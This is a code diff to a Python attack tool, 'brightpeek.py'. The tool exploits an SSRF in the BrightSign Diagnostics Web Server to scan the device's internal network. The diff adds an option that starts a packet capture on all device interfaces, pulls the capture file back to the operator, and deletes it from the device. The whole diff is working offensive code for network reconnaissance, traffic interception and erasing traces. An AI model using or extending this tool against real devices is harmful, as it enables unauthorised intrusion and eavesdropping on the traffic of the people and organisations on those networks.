@@ -3,7 +3,11 @@
     For probing internal network through BrightSign device SSRF in BrightSign Diagnostics Web Server
     Slow but steady :)
     Usage:
-    ./brightpeek.py DEVICE_ADDRESS:DEVICE_PORT_NUMBER
+    ./brightpeek.py DEVICE_ADDRESS:DEVICE_PORT_NUMBER --pcap FILE_LOCATION
+    
+    Optional:
+        --pcap FILE_LOCATION         Use Network Diagnostics packet capture and store PCAP locally to LOCATION
+                                (Default location /tmp/capture.pcap)
 '''
 
 import sys
@@ -12,12 +16,30 @@ import ipaddress
 
 VULN_ENDPOINT = 'speedtest?url='
 INFO_ENDPOINT = 'netconfig.html?ref=diagnostics.html'
+NETCAP_START_ENDPOINT = 'packet_capture.html?interface=any&file=bs.pcap&duration=0&maxpackets=0&snaplen=0&filter=&action=Start'
+NETCAP_STOP_ENDPOINT = 'packet_capture.html?action=Stop'
+PCAP_FILE_ENDPOINT = 'save?rp=sd/bs.pcap'
+PCAP_DELETE_ENDPOINT = 'delete?filename=sd%2Fbs.pcap&delete=Delete'
+PCAP_SAVE_LOCATION = '/tmp/capture.pcap'
 IP_LINE = '<b>Current IP:</b> '
 NET_LINE = '<b>Netmask:</b> '
 TEST_PORTS = {1337}
+REQ_HEAD = {
+    'User-Agent': 'Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0',   # for the lulz
+    'Access-Control-Allow-Origin': '*',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Cookie': 'language=en; updateTips=true; enableAnonymous8888=false; enableAnonymous9988=false',
+    'DNT': '1',
+    'Connection': 'close',
+    'Upgrade-Insecure-Requests': '1'
+}
 
 ext_ip = None
 ext_port = None
+pcap = False
+pcap_file = None
 
 result_list = []
 def print_results():
@@ -35,9 +57,21 @@ def check_args(args):
     if (len(args) < 2):
         return 1
 
-    if (len(args) > 2):
+    if (len(args) > 4):
         print("Too many arguments")
         return 1
+
+    if (len(args) >= 3):
+        if (args[2] != '--pcap'):
+            print("Invalid option.")
+            return 1
+        global pcap
+        global pcap_file
+        pcap = True
+        try:
+            pcap_file = args[3].strip()
+        except:
+            pcap_file = PCAP_SAVE_LOCATION
 
     if (len(args[1].split(':')) != 2):
         print("Invalid syntax")
@@ -56,6 +90,47 @@ def check_args(args):
       
     return 0
 
+# Collect network traffic through Network Diagnostics packet capturing
+pcap_running = False
+def pcap_collect(pcap_ctl):
+    req_base = f"http://{ext_ip}:{ext_port}"
+    req_headers = {
+        'Host': ext_ip + ':' + str(ext_port)
+    }
+    req_headers.update(REQ_HEAD)
+    
+    # Start/Stop PCAP
+    req_string = f"{req_base}/{NETCAP_START_ENDPOINT}" if pcap_ctl else f"{req_base}/{NETCAP_STOP_ENDPOINT}"
+    try:
+        response = requests.get(req_string, headers=req_headers)
+    except Exception as e:
+        print(f"Could not complete PCAP capture request : {e}")
+        return 1
+
+    # Save PCAP locally and delete from device
+    if not pcap_ctl:
+        req_string = f"{req_base}/{PCAP_FILE_ENDPOINT}"
+        try:
+            response = requests.get(req_string, headers=req_headers)
+            try:
+                global pcap_file
+                with open(pcap_file, 'wb') as f:
+                    f.write(response.content)
+                print(f"Saved PCAP locally to {pcap_file}")
+            except Exception as e:
+                print(f"Could not save PCAP at location {pcap_file}")
+        except Exception as e:
+            print(f"Could not save PCAP file to {pcap_file}")
+        
+        req_string = f"{req_base}/{PCAP_DELETE_ENDPOINT}"
+        try:
+            response = requests.get(req_string, headers=req_headers)
+            print("Deleting PCAP from device.")
+        except Exception as e:
+            print("Could not delete PCAP file from device at specified location.")
+    
+    return 0
+
 def main(args):
     if check_args(args):
         print_help()
@@ -65,17 +140,9 @@ def main(args):
     req_base = f"http://{ext_ip}:{ext_port}"
     req_headers = {
         'Host': ext_ip + ':' + str(ext_port),
-        'User-Agent': 'Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0',   # for the lulz
-        'Access-Control-Allow-Origin': '*',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Cookie': 'language=en; updateTips=true; enableAnonymous8888=false; enableAnonymous9988=false',
-        'DNT': '1',
-        'Connection': 'close',
-        'Upgrade-Insecure-Requests': '1'
     }
-
+    req_headers.update(REQ_HEAD)
+    
     # Get internal IP address of BrightSign device
     info_req = requests.get(f"{req_base}/{INFO_ENDPOINT}", headers=req_headers)
     info_split = info_req.content.split(b'\n')
@@ -107,6 +174,14 @@ def main(args):
     print(f"Internal IP:        {int_ip}")
     print(f"Internal Network:   {int_net}")
 
+    if pcap:
+        # Start network capture
+        global pcap_running
+        if not pcap_collect(True):
+            print(f"Storing PCAP:       {pcap_file}")
+            print("Started network capture.")
+            pcap_running = True
+
     #Iterate through IP range
     print("Scanning (this may take a while)...")
     
@@ -136,6 +211,9 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         print("\n\nCtrl-C pressed, exiting.")
     
+    if pcap_running:
+        pcap_collect(False)
+        
     print_results()
     print("Done.")
     
